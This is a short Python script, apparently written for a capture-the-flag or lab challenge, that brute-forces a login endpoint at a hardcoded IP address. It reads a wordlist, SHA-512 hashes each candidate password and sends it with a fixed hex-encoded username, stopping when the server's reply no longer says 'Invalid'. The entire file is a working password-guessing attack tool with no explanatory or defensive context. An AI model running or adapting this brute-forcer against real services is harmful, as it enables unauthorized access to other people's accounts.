#!/usr/bin/python3

import hashlib
import requests

URL = 'http://35.234.65.24:32506/auth'

def main():
    f = open('testwordlist.txt','r')
    line = f.readline()
    for line in f:
        pwn = line.rstrip()
        user = '416c6578'
        password = hashlib.sha512(pwn.encode()).hexdigest()
        r = requests.get(URL,{'name' : user,'password' : password})
        if 'Invalid' not in r.text:
            print('Found it, {}'.format(password),' plaintext : ', pwn ,r.text)
            quit(0)
        else:
            print(r.text, password, pwn)

if __name__ == '__main__':
    main()


